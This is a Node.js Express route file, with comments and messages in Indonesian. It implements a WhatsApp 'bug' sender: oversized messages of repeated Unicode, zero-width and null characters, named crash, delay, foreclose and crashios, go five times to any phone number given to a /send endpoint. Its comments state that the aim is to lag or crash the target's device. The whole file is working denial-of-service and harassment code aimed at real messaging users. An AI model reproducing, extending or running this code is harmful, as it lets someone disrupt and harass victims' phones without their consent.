const express = require('express');
const router = express.Router();
const pairingRouter = require('./pairing');

const PAYLOADS = {
  crash: 'ڪ'.repeat(50000),
  delay: '\u200b'.repeat(50000),
  foreclose: 'ｦ'.repeat(8000) + '\u0000'.repeat(1000),
  crashios: '𝕏'.repeat(60000) + '\u200d'.repeat(2000)
};

router.post('/send', async (req, res) => {
  try {
    const { target, type } = req.body;
    if (!target || !type) return res.status(400).json({ ok: false, msg: 'Missing fields' });

    const sock = pairingRouter.getSock();
    if (!sock) return res.status(400).json({ ok: false, msg: 'WhatsApp belum di-pairing. Silakan ke menu Pairing.' });

    const payload = PAYLOADS[type];
    if (!payload) return res.status(400).json({ ok: false, msg: 'Payload tidak dikenal' });

    // Bersihkan nomor telepon (hapus +, spasi, strip)
    const cleanTarget = target.replace(/[^0-9]/g, '');
    const jid = cleanTarget + '@s.whatsapp.net';

    let sent = 0;
    // Kirim berulang kali untuk memicu delay/crash di device target
    for (let i = 0; i < 5; i++) {
      try {
        await sock.sendMessage(jid, { text: payload });
        sent++;
        await new Promise(r => setTimeout(r, 1000)); // jeda 1 detik per pesan
      } catch (err) {
        console.log('Gagal kirim bug:', err.message);
      }
    }

    res.json({ ok: true, msg: `Berhasil mengirim payload ${type} ke ${cleanTarget}`, packetsSent: sent });
  } catch (e) {
    res.status(500).json({ ok: false, msg: e.message });
  }
});

module.exports = router;
